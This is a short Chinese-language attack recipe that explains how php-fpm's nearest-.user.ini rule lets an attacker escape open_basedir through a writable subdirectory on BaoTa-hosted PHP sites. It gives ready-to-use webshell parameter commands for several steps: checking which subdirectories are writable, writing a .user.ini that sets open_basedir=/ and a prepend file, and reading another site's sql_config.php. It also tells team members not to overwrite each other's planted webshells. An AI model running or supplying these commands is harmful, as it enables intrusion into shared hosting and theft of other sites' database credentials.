## 描述

PHP 的 .user.ini 机制：php-fpm 从**被执行脚本所在目录向上**查找第一个 .user.ini 并**只应用它**（不叠加、不取最严）。因此若某个**子目录可写**而 docroot 本身不可写，就能在该子目录放一个 .user.ini 覆盖上层（docroot 级）的 open_basedir 与 auto_prepend_file。典型场景：宝塔站点 docroot 属 root(755) 不可写，但 data/、data/bbscache/、2022/ 等运行时目录属 www(755) 可写 —— 这就是逃逸口。

## 用法

```
前置：已有某个 vhost 的任意 PHP 执行，但被 open_basedir 限制在该站 docroot 内。
步骤：
1) 确认子目录可写：`c=foreach(array("../data","../data/bbscache","../2022","..") as $d){$s=@stat($d);printf("%s mode=%o uid=%d w=%d\n",$d,$s["mode"]&07777,$s["uid"],@is_writable($d));}`
2) 在**可写子目录**写 .user.ini：
   `c=@file_put_contents("../data/.user.ini","auto_prepend_file=/tmp/pwn.inc\nopen_basedir=/");`
   （若上层已存在 .user.ini，会覆盖/追加；建议先 `file_get_contents` 备份原内容）
3) 等 user_ini.cache_ttl（默认 300s）或换个未被缓存的子目录再落一个，然后验证：
   `c=echo ini_get("open_basedir");`  期望回 `/`
4) 逃逸后即可跨目录读写：
   `c=echo @file_get_contents("/www/wwwroot/<OTHER_SITE>/data/sql_config.php");`
   `c=echo implode(" ",@scandir("/www/wwwroot/"));`

⚠️ 副作用与纪律：会改动目标 .user.ini（业务影响小但属真实改动），务必先备份原内容；多路协同时**不要覆盖别人已放的 .user.ini/马**，各用各的子目录（例如 A 用 data/、B 用 2022/）以免互相踩踏。
```
